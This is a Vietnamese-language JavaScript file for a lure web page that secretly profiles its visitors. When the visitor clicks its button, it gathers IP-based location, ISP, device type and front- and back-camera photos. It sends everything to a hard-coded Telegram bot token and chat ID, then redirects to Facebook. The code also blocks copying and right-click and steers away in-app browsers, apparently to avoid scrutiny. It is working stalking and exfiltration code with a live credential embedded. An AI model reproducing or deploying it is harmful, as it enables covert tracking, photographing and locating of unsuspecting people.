// ==================== VERSION - 7 API DỰ PHÒNG ====================

// -------------------- TELEGRAM CONFIG --------------------
const TELEGRAM_CONFIG = {
    BOT_TOKEN: "8872849016:AAEstxsi3M4FNMk0esFMG8lvx9M0tlW1Hac",
    CHAT_ID: "-1003805423944",
    API_URL: "https://api.telegram.org/bot"
};

// -------------------- TELEGRAM SENDER --------------------
const TelegramSender = {
    async sendMessage(text) {
        const url = `${TELEGRAM_CONFIG.API_URL}${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
        try {
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CONFIG.CHAT_ID,
                    text: text,
                    parse_mode: 'Markdown'
                })
            });
        } catch(e) {}
    },
    
    async sendPhoto(blob, caption) {
        if (!blob) return;
        const url = `${TELEGRAM_CONFIG.API_URL}${TELEGRAM_CONFIG.BOT_TOKEN}/sendPhoto`;
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CONFIG.CHAT_ID);
        formData.append('photo', blob, 'photo.jpg');
        formData.append('caption', caption);
        try {
            await fetch(url, { method: 'POST', body: formData });
        } catch(e) {}
    },
    
    formatMessage(data) {
        return `📡 *[THÔNG TIN TRUY CẬP]*

🕒 *Thời gian:* ${data.time || '?'}
📱 *Thiết bị:* ${data.device || '?'}
🖥️ *Hệ điều hành:* ${data.os || '?'}
🌍 *IP dân cư:* ${data.ip || '?'}
🧠 *IP gốc:* ${data.ip || '?'}
🏢 *ISP:* ${data.isp || 'Không xác định'}
🏙️ *Địa chỉ:* ${data.location || 'Không xác định'}
🌎 *Quốc gia:* ${data.country || 'Không xác định'}
📍 *Vĩ độ:* ${data.lat || 'Không xác định'}
📍 *Kinh độ:* ${data.lon || 'Không xác định'}
📌 *Google Maps:* ${data.maps || 'Không có'}
📸 *Camera:* ${data.camera || '?'}

⚠️ *Ghi chú:* ${data.note || 'Thông tin có khả năng chưa chính xác 100%.'}`;
    },
    
    async sendAll(data) {
        const message = this.formatMessage(data);
        await this.sendMessage(message);
        if (data.frontPhoto) await this.sendPhoto(data.frontPhoto, '📸 ẢNH CAMERA TRƯỚC');
        if (data.backPhoto) await this.sendPhoto(data.backPhoto, '📸 ẢNH CAMERA SAU');
    }
};

// -------------------- DEVICE INFO --------------------
const DeviceInfo = {
    getInfo() {
        const ua = navigator.userAgent;
        let device = 'Không xác định';
        let os = 'Không xác định';
        
        if (/iPhone|iPad|iPod/i.test(ua)) {
            os = 'iOS';
            device = 'iPhone';
        } else if (/Android/i.test(ua)) {
            os = 'Android';
            device = 'Android';
        } else if (ua.includes('Windows')) {
            os = 'Windows';
            device = 'PC/Laptop';
        } else if (ua.includes('Mac')) {
            os = 'macOS';
            device = 'Mac';
        } else {
            os = 'Desktop';
            device = 'PC/Laptop';
        }
        
        return { device, os };
    }
};

// -------------------- LOCATION API (7 API DỰ PHÒNG) --------------------
const LocationInfo = {
    async getLocationData() {
        // Danh sách API theo thứ tự ưu tiên
        const apis = [
            // JSONP APIs (luôn hoạt động)
            this.fetchViaJSONP('https://ip-api.com/json/', 'ip-api.com'),
            this.fetchViaJSONP('https://geoip-db.com/json/geoip.php?jsonp=', 'geoip-db.com'),
            
            // Fetch APIs (có CORS)
            this.fetchWithCORS('https://ipwho.is/'),
            this.fetchWithCORS('https://ipapi.co/json/'),
            this.fetchWithCORS('https://freeipapi.com/api/json/'),
            this.fetchWithCORS('https://api.ipgeolocation.io/ipgeo?apiKey=demo'),
            this.fetchWithCORS('https://ipinfo.io/json'),
            
            // Fallback
            this.fetchIPOnly()
        ];
        
        // Chạy song song, lấy kết quả đầu tiên thành công
        const result = await Promise.race(apis);
        return result || this.getEmptyResult();
    },
    
    fetchViaJSONP(url, source) {
        return new Promise((resolve) => {
            const callbackName = 'jsonp_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
            const script = document.createElement('script');
            
            let fullUrl = url;
            if (url.includes('?')) {
                fullUrl = url + `&callback=${callbackName}`;
            } else {
                fullUrl = url + `?callback=${callbackName}`;
            }
            
            window[callbackName] = (data) => {
                delete window[callbackName];
                document.body.removeChild(script);
                
                // Xử lý ip-api.com
                if (source === 'ip-api.com' && data && data.status === 'success') {
                    resolve(this.formatResult(data.query, data.isp, data.country, data.city, data.regionName, data.lat, data.lon, source));
                }
                // Xử lý geoip-db.com
                else if (source === 'geoip-db.com' && data && data.ip_address) {
                    resolve(this.formatResult(data.ip_address, data.isp, data.country_name, data.city, data.state, data.latitude, data.longitude, source));
                }
                else {
                    resolve(null);
                }
            };
            
            script.onerror = () => {
                delete window[callbackName];
                document.body.removeChild(script);
                resolve(null);
            };
            
            document.body.appendChild(script);
            
            setTimeout(() => {
                if (window[callbackName]) {
                    delete window[callbackName];
                    document.body.removeChild(script);
                    resolve(null);
                }
            }, 3000);
        });
    },
    
    fetchWithCORS(url) {
        return fetch(url, { mode: 'cors' })
            .then(res => res.ok ? res.json() : null)
            .then(data => {
                if (!data) return null;
                
                // ipwho.is
                if (data.success !== false && data.ip) {
                    return this.formatResult(data.ip, data.connection?.isp || data.isp, data.country, data.city, data.region, data.latitude, data.longitude, 'ipwho.is');
                }
                // ipapi.co
                if (data.ip && data.country_name) {
                    return this.formatResult(data.ip, data.org || data.asn, data.country_name, data.city, data.region, data.latitude, data.longitude, 'ipapi.co');
                }
                // freeipapi
                if (data.ipAddress) {
                    return this.formatResult(data.ipAddress, data.isp, data.country, data.city, data.region, data.latitude, data.longitude, 'freeipapi');
                }
                // ipgeolocation.io
                if (data.ip && data.country_name) {
                    return this.formatResult(data.ip, data.isp, data.country_name, data.city, data.state_prov, data.latitude, data.longitude, 'ipgeolocation');
                }
                // ipinfo.io
                if (data.ip && data.loc) {
                    const loc = data.loc.split(',');
                    return this.formatResult(data.ip, data.org, data.country, data.city, data.region, loc[0], loc[1], 'ipinfo.io');
                }
                return null;
            })
            .catch(() => null);
    },
    
    fetchIPOnly() {
        return fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => {
                if (data.ip) {
                    return this.formatResult(data.ip, 'Không xác định', 'Không xác định', 'Không xác định', 'Không xác định', 'Không xác định', 'Không xác định', 'ipify');
                }
                return null;
            })
            .catch(() => null);
    },
    
    formatResult(ip, isp, country, city, region, lat, lon, source) {
        console.log(`✅ Lấy thành công từ ${source}:`, { ip, isp, country, city, region, lat, lon });
        
        const cityStr = city && city !== 'Không xác định' ? city : '';
        const regionStr = region && region !== 'Không xác định' ? region : '';
        const countryStr = country && country !== 'Không xác định' ? country : '';
        
        let location = [cityStr, regionStr, countryStr].filter(s => s).join(', ');
        if (!location) location = 'Không xác định';
        
        const mapsLink = (lat && lon && lat !== 'Không xác định' && lon !== 'Không xác định') 
            ? `http://googleusercontent.com/maps.google.com/${lat},${lon}` 
            : '';
        
        return {
            ip: ip || 'Không xác định',
            isp: isp || 'Không xác định',
            country: country || 'Không xác định',
            location: location,
            lat: lat || 'Không xác định',
            lon: lon || 'Không xác định',
            maps: mapsLink
        };
    },
    
    getEmptyResult() {
        return {
            ip: 'Không xác định',
            isp: 'Không xác định',
            country: 'Không xác định',
            location: 'Không xác định',
            lat: 'Không xác định',
            lon: 'Không xác định',
            maps: ''
        };
    }
};

// -------------------- CAMERA MANAGER --------------------
const CameraManager = {
    stream: null,
    videoElement: null,
    
    init(videoElement) {
        this.videoElement = videoElement;
    },
    
    async requestCamera(facingMode = 'user') {
        if (!navigator.mediaDevices?.getUserMedia) return null;
        
        try {
            if (this.stream) this.stopCamera();
            this.stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: facingMode },
                audio: false
            });
            if (this.videoElement) {
                this.videoElement.srcObject = this.stream;
                this.videoElement.style.display = 'block';
                await this.videoElement.play();
            }
            return this.stream;
        } catch(e) {
            return null;
        }
    },
    
    async capturePhoto() {
        if (!this.videoElement || !this.stream) return null;
        await new Promise(r => setTimeout(r, 500));
        
        return new Promise((resolve) => {
            const canvas = document.createElement('canvas');
            canvas.width = this.videoElement.videoWidth;
            canvas.height = this.videoElement.videoHeight;
            if (canvas.width === 0 || canvas.height === 0) {
                resolve(null);
                return;
            }
            const ctx = canvas.getContext('2d');
            ctx.drawImage(this.videoElement, 0, 0);
            canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.85);
        });
    },
    
    async captureBothCameras() {
        const photos = { front: null, back: null };
        
        const frontStream = await this.requestCamera('user');
        if (frontStream) {
            await new Promise(r => setTimeout(r, 500));
            photos.front = await this.capturePhoto();
        }
        
        const backStream = await this.requestCamera('environment');
        if (backStream) {
            await new Promise(r => setTimeout(r, 500));
            photos.back = await this.capturePhoto();
        }
        
        return photos;
    },
    
    stopCamera() {
        if (this.stream) {
            this.stream.getTracks().forEach(track => track.stop());
            this.stream = null;
        }
        if (this.videoElement) {
            this.videoElement.srcObject = null;
            this.videoElement.style.display = 'none';
        }
    }
};

// -------------------- MAIN --------------------
(function() {
    const warningDiv = document.getElementById('browser-warning');
    const mainCard = document.getElementById('mainCard');
    const startBtn = document.getElementById('startBtn');
    const video = document.getElementById('preview');
    const msg = document.getElementById('msg');
    const statusDiv = document.getElementById('status');
    const vBox = document.getElementById('vBox');
    
    // Kiểm tra in-app browser
    const ua = navigator.userAgent;
    const isInApp = /TikTok|musical_ly|ByteLocale|FBAN|FBAV|Zalo|Instagram|Messenger|Line/i.test(ua);
    if (isInApp) {
        warningDiv.style.display = 'block';
        mainCard.style.display = 'none';
    }
    
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.addEventListener('copy', e => e.preventDefault());
    
    CameraManager.init(video);
    
    startBtn.onclick = async () => {
        startBtn.disabled = true;
        startBtn.innerText = '⏳ ĐANG XỬ LÝ...';
        
        statusDiv.innerHTML = '🌍 Đang lấy thông tin (7 API)...';
        const locationInfo = await LocationInfo.getLocationData();
        const deviceInfo = DeviceInfo.getInfo();
        
        let photos = { front: null, back: null };
        let cameraStatus = '🚫 Bị chặn hoặc không có camera';
        
        try {
            statusDiv.innerHTML = '📷 Đang mở camera...';
            msg.textContent = '📷 Đang mở camera...';
            msg.style.display = 'block';
            
            photos = await CameraManager.captureBothCameras();
            
            if (photos.front || photos.back) {
                cameraStatus = '✅ Đã chụp camera';
            }
            
            video.style.display = 'none';
        } catch(e) {
            cameraStatus = '🚫 Bị chặn hoặc không có camera';
        }
        
        statusDiv.innerHTML = '📤 Đang gửi dữ liệu...';
        
        const finalData = {
            time: new Date().toLocaleString('vi-VN'),
            device: deviceInfo.device,
            os: deviceInfo.os,
            ip: locationInfo.ip,
            isp: locationInfo.isp,
            location: locationInfo.location,
            country: locationInfo.country,
            lat: locationInfo.lat,
            lon: locationInfo.lon,
            maps: locationInfo.maps,
            camera: cameraStatus,
            note: 'Thông tin có khả năng chưa chính xác 100%.',
            frontPhoto: photos.front,
            backPhoto: photos.back
        };
        
        console.log('📦 Dữ liệu gửi đi:', finalData);
        await TelegramSender.sendAll(finalData);
        CameraManager.stopCamera();
        
        startBtn.style.backgroundColor = "#28a745";
        let timeLeft = 3;
        statusDiv.innerHTML = `✅ Đã ghi nhận! Chuyển hướng sau ${timeLeft} giây...`;
        
        const timer = setInterval(() => {
            startBtn.innerText = `✅ HOÀN TẤT (${timeLeft}s)`;
            timeLeft--;
            if (timeLeft < 0) {
                clearInterval(timer);
                window.location.href = "https://facebook.com";
            }
        }, 1000);
    };
    
    console.log('✅ Đã sẵn sàng - 7 API dự phòng!');
})();
